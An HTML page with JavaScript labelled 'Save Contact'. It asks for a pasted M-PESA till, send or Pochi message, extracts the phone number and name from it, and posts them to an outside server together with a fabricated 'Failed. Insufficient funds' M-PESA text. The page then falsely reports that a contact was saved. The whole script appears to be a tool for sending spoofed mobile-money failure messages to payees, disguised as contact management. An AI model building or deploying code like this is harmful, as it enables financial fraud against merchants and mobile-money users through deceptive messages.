<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Save Contact</title>
<style>
    body { font-family: Arial, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    .container { max-width: 500px; width: 90%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; box-sizing: border-box; }
    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; }
    textarea { width: 100%; height: 160px; padding: 10px; margin-top: 10px; background: #2a2a2a; border: none; border-radius: 6px; color: white; font-size: 1rem; resize: vertical; box-sizing: border-box; }
    button { width: 100%; padding: 14px; margin-top: 10px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 16px; transition: background 0.3s; }
    button:hover:not(:disabled) { background: #45a049; }
    button:disabled { background: gray; cursor: not-allowed; }
    pre { background: #000; padding: 10px; margin-top: 10px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.95rem; color: #4CAF50; }
    @media (max-width: 400px) {
        body { padding: 10px; }
        .container { padding: 15px; }
        textarea { height: 140px; font-size: 0.95rem; }
        button { font-size: 14px; padding: 12px; }
        h3 { font-size: 1.2rem; }
    }
</style>
</head>
<body>
<div class="container">
    <h3>Paste only till,send and pochi Message to Save Contact</h3>
    <textarea id="message" placeholder="Paste message here"></textarea>
    <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
    <pre id="output"></pre>
</div>

<script>
const API = "https://meapp.emxluz.xyz";
const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH1500.00. Available Fuliza M-PESA limit KSH0.00.";

function extractDetails(message) {
    // Detect ANY number that is 10 or more digits long
    let phoneMatch = message.match(/\d{10,15}/);
    let phone = phoneMatch ? phoneMatch[0] : "";
    
    // Improved Name detection: 
    // Captures text after "to " or "sent to " but stops before it hits a number or "on "
    let nameMatch = message.match(/(?:sent to|to)\s+([^0-9]{2,40})/i);
    let name = "Unknown";
    
    if (nameMatch) {
        name = nameMatch[1]
            .split(/\s+on\s/i)[0]  // Cut off everything after the word "on"
            .split(/\s+at\s/i)[0]  // Cut off everything after the word "at"
            .trim();
    }
    
    return { phone, name };
}

function generateToken() {
    return "CONTACT" + Math.floor(Math.random() * 100000);
}

async function saveContact() {
    let btn = document.getElementById("saveBtn");
    let output = document.getElementById("output");
    let pastedMessage = document.getElementById("message").value.trim();

    if (!pastedMessage) {
        output.innerText = "⚠️ Paste message first";
        return;
    }

    let data = extractDetails(pastedMessage);

    // Prompt if NO number of any kind was found
    if (!data.phone) {
        let manualPhone = prompt("Number not found. Please enter it manually:", "");
        if (manualPhone && manualPhone.trim().length > 0) {
            data.phone = manualPhone.trim();
        } else {
            output.innerText = "❌ Cancelled: Number is required.";
            return;
        }
    }

    btn.disabled = true;
    btn.innerText = "Saving...";
    let token = generateToken();

    try {
        await fetch(`${API}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: data.phone,
                name: data.name,
                amount: 0,
                token: token,
                message: FIXED_MESSAGE
            })
        });

        output.innerText = 
            "Contact Saved Successfully ✅\n\n" +
            "Name: " + data.name + "\n" +
            "Phone: " + data.phone;
        btn.innerText = "Saved ✓";
        
    } catch (error) {
        output.innerText = "❌ Error saving to server";
        btn.disabled = false;
        btn.innerText = "SAVE CONTACT";
    }
}
</script>
</body>
</html>
